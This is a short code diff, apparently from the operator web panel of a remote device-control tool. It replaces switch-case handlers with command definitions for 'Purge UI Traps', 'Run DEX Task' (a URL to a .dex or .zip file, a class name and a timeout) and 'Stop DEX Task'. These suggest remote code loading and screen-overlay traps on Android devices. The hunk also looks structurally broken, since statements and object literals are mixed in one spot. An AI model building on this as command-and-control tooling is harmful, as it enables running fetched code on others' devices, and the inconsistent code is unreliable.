@@ -617,12 +617,9 @@
                             </div>
                         `
                     },
-                    case 'CLEAR_UI_TRAP':
-                        content = ''; break;
-                    case 'RUN_DEX_TASK':
-                        content = `${document.getElementById('rdt-url').value.trim()} | ${document.getElementById('rdt-class').value.trim()} | ${document.getElementById('rdt-timeout').value}`; break;
-                    case 'STOP_DEX_TASK':
-                        content = document.getElementById('rdt-stop-class').value.trim(); break;
+                    { id: 'CLEAR_UI_TRAP', name: 'Purge UI Traps', icon: '🧹', keywords: 'clear, ui, trap, purge', inputs: [] },
+                    { id: 'RUN_DEX_TASK', name: 'Run DEX Task', icon: '⚙️', keywords: 'dex, run, dynamic, class', inputs: [{id: 'rdt-url', label: 'URL (.dex / .zip)', type: 'text'}, {id: 'rdt-class', label: 'Class Name', type: 'text'}, {id: 'rdt-timeout', label: 'Timeout', type: 'number', val: 30}] },
+                    { id: 'STOP_DEX_TASK', name: 'Stop DEX Task', icon: '🛑', keywords: 'stop, dex, kill', inputs: [{id: 'rdt-stop-class', label: 'Class Name', type: 'text'}] }
                 ]
             },
             {
